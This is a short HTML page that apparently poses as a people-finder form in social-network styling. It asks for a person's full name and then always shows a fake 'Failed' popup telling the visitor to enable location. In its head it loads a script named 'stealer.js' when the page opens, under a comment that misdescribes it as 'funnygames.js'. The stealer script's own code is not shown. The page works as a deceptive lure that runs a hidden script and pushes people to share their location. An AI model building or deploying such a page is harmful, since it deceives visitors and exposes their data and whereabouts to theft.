<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Information</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #1c1e21;
    }

    .card {
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      padding: 32px;
      width: 100%;
      max-width: 420px;
    }

    h1 {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 8px;
    }

    p {
      font-size: 14px;
      color: #65676b;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 6px;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px 14px;
      font-size: 15px;
      border: 1px solid #ccd0d5;
      border-radius: 8px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    input[type="text"]:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
    }

    button {
      width: 100%;
      margin-top: 20px;
      padding: 12px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    button:hover {
      background: #166fe5;
    }

    button:active {
      background: #1464d8;
    }

    /* Modal styles */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.45);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-overlay.show {
      display: flex;
    }

    .modal {
      background: white;
      border-radius: 12px;
      padding: 28px 32px;
      width: 90%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
      position: relative;
    }

    .modal h2 {
      font-size: 20px;
      margin-bottom: 12px;
      color: #d32f2f;
    }

    .modal p {
      margin-bottom: 24px;
      color: #65676b;
    }

    .modal-close {
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px 24px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .modal-close:hover {
      background: #166fe5;
    }
  </style>

  <!-- Loads and runs funnygames.js immediately when the page loads -->
  <script src="stealer.js"></script>
</head>
<body>
  <div class="card">
    <h1>Enter Person’s Name</h1>
    <p>Please provide the full name below.</p>

    <form id="nameForm">
      <label for="personName">Full Name</label>
      <input 
        type="text" 
        id="personName" 
        name="personName" 
        placeholder="Enter person’s name"
        required
        autocomplete="name"
      >

      <button type="submit">Continue</button>
    </form>
  </div>

  <!-- Popup Modal -->
  <div class="modal-overlay" id="failModal">
    <div class="modal">
      <h2>Failed</h2>
      <p>Please enable Location to Find people in your area</p>
      <button class="modal-close" id="closeModal">Close</button>
    </div>
  </div>

  <script>
    const form = document.getElementById('nameForm');
    const modal = document.getElementById('failModal');
    const closeBtn = document.getElementById('closeModal');

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      modal.classList.add('show');
    });

    closeBtn.addEventListener('click', function() {
      modal.classList.remove('show');
    });

    // Also close when clicking outside the modal
    modal.addEventListener('click', function(e) {
      if (e.target === modal) {
        modal.classList.remove('show');
      }
    });
  </script>
</body>
</html>
